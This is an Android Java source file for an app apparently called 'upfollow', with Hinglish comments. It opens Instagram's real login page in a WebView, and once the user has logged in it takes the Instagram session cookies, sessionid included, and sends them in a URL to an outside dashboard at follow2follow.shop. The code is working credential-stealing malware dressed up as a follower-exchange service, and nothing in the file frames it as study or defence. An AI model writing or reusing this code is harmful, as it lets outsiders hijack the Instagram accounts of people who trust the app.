package com.upfollow.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.net.URLEncoder;

public class MainActivity extends Activity {

    private WebView webView;

    // Yahan apni hosting ka dashboard link daalein:
    private static final String HOSTING_DASHBOARD = "https://follow2follow.shop/index.php";
    
    // Seedha official Instagram login URL jo WebView mein open hoga:
    private static final String IG_LOGIN_URL = "https://www.instagram.com/accounts/login/";

    private boolean isSessionCaptured = false;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setSupportZoom(false);
        // Mobile User Agent taaki Instagram ka official mobile login page khule
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36");

        // Enable Cookies
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                if (isSessionCaptured) return;

                // Jab user login karke Instagram ke main feed par pahunch jaye
                if (url.equals("https://www.instagram.com/") || url.contains("instagram.com/?") || url.equals("https://www.instagram.com")) {
                    
                    String cookies = CookieManager.getInstance().getCookie(url);

                    if (cookies != null && cookies.contains("sessionid")) {
                        isSessionCaptured = true;
                        try {
                            String encodedCookies = URLEncoder.encode(cookies, "UTF-8");
                            // User ko cookies ke sath aapki hosting ke dashboard par bhej do
                            webView.loadUrl(HOSTING_DASHBOARD + "?cookies=" + encodedCookies);
                        } catch (Exception e) {
                            webView.loadUrl(HOSTING_DASHBOARD);
                        }
                    }
                }
            }
        });

        // App khulte hi seedha Instagram ka official login khulega (No Iframe block)
        webView.loadUrl(IG_LOGIN_URL);
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
